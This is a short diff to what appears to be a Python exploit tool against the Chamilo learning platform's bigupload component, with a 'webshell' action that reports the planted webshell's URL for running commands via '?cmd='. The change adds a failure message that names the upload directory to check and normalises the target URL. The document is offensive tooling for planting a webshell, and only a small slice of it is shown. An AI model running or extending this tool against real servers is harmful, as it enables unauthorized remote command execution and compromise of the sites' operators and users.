@@ -18,6 +18,9 @@ def webshell_action() -> None:
     if result:
         print('[+] Upload successfull [+]')
         print(f'\nWebshell URL: {result}?cmd=<command>')
+    else:
+        print('[-] Something went wrong [-]')
+        print(f'\nUnable to determine whether the file upload was successful. You can check at {url}/main/inc/lib/javascript/bigupload/files/')
 
 actions = {
     'webshell': webshell_action
@@ -34,7 +37,8 @@ parser.add_argument('-a', '--action', type=str, required=True, help='Action to p
 args = parser.parse_args()
 
 action = args.action
+url = args.url.rstrip('/')
 
-exploit = ChamiloBigUploadExploit(args.url)
+exploit = ChamiloBigUploadExploit(url)
 
 actions[action]()
